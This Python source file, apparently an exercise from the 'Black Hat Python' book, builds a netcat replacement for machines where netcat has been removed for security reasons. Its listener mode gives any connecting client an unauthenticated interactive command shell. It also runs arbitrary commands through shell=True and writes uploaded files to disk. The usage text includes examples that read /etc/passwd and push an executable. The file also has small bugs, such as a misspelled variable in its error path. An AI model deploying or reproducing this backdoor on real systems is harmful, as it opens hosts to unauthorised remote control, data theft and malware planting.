#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Example of netcat replacement for when a sysadmin has removed netcat from his system, for secutiry reasons.
# It’s useful to create a simple network client and server that you can use to push files, or to have a listener that gives you command-line access.

import sys
import socket
import getopt
import threading
import subprocess

# # Here, we are just importing all of our necessary libraries and setting some global variables

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

# Our main function responsible for handling command-line arguments and calling the rest of our functions

def usage():
    print("BHP Net Tool")
    print("")
    print("Usage: bhp_net_tool.py -t target_host -p port")
    print("-l --listen                  - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run     - execute the given file upon receiving a connection")
    print("-c --command                 - initialize a command shell")
    print("-u --upload=destination      - upon receiving connection upload a file and write to [destination]")
    print("")
    print("")
    print("Examples:")
    print("bhp_net_tool.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhp_net_tool.py -t 192.168.0.1 -p 5555 -l -u=/home/user/desktop/file.exe")
    print("bhp_net_tool.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABDCEFGHI' | ./bhp_net_tool.py -t 192.168.0.1 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()                 # If program run without arguments, show commandline options

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help","listen","execute","target","port","command","upload"])  #We begin by reading in all of the command-line options and setting the necessary variables depending on the options we detect. If any of the command-line parameters don’t match our criteria, we print out useful usage information.
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # Just for my understanding of how getopt works
    #print("OPTIONS: " + str(opts) + "\n")

    #for o,a in opts:
    #    print(str(o)+ " " + str(a))

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--command"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"  # assert False raises an error and quits the program while displaying our error message.

    # Are we going to listen or just send data from stdin?

    if not listen and len(target) and port > 0:
        # If we don't tell it to listen, read in buffer from the command line
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

    # We are going to listen and potentially upload things, execute commands and drop a shell back
    # depending onour command line options above
    if listen:
        server_loop()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # We start by setting up our TCP socket object and then test to see if we have received any input from stdin.

    try:
        # Connect to our target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            # Now wait for data back
            recv_len = 1
            response = ""

            while recv_len:               # If all is well, we ship the data off to the remote target and receive back data until there is no more data to receive.

                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response)

            # Wait for more input
            buffer = raw_input("")          # We then wait for further input from the user and continue
                                            # sending and receiving data until the user kills the script.
                                            # The extra line break is attached specifically to our user
                                            # input so that our client will be compatible with our command shell.
            buffer += "\n"

            # Send it off
            client.send(buffer)

    except Exception as e:
        print(e)
        print("[*] Exception! Exiting.")
        # Tear down the connection
        client.close()

def server_loop():
    global target

    # If no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # Spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):

    # Trim the newline
    command = command.rstrip()

    # Run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)  # Subprocess provides a powerful process-creation interface that gives you a number of ways to start and interact with client programs.
                                                                                         # We’re simply running whatever command we pass in, running it on the local operating system, and returning the output from the command back to the client that is connected to us.
    except:
        ouput = "Failed to execute command.\r\n"

    # Send the output back to the client
    return output


# Now let's implement the logic to do file uploads, command execution, and our shell

def client_handler(client_socket):
    global upload
    global execute
    global command

    # Check for upload
    if len(upload_destination):

        # Read in all of the bytes and write to our destination
        file_buffer = ""

        # Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # Now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Acknowledge that we wrote the file out
            client_socket.send("Successfully saved the file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # Check for command execution
    if len(execute):

        # Run the command
        output = run_command(execute)

        client_socket.send(output)

    # Now we go into another loop if a command shell was requested
    if command:

        while True:
            # Show a simple prompt
            client_socket.send("<BHP:#> ")

            # Now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # Send back the command output
            response = run_command(cmd_buffer)

            # Send back the response
            client_socket.send(response)

main()
